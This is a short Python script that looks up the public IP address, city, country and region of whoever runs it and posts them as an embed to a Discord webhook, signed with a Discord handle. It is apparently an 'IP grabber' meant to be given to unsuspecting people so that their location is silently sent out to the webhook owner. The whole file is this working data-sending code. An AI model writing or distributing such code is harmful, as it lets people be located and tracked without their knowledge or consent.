import requests, json
webhook = 'webhook here'

def post():
    data = requests.get("http://ipinfo.io/json").json()
    ip = data['ip']
    c = data['city']
    co = data['country']
    r = data['region'] 
    info = {
  "content": "",
  "embeds": [
    {
      "title": "IP Found",
      "description": f"```\nIP : {ip}\nCity : {c}\nCountry : {co}\nRegion : {r}\n```",
      "color": 1341395,
      "footer": {
        "text": "scooby#0001"
      },
      "image": {
        "url": "https://media.discordapp.net/attachments/860177535010603028/1013141468484993096/unknown.png"
      }
    }
  ],
  "username": "Angel",
  "avatar_url": "https://media.discordapp.net/attachments/860177535010603028/1013141468484993096/unknown.png",
  "attachments": []
    }
    requests.post(webhook, json=info)
post()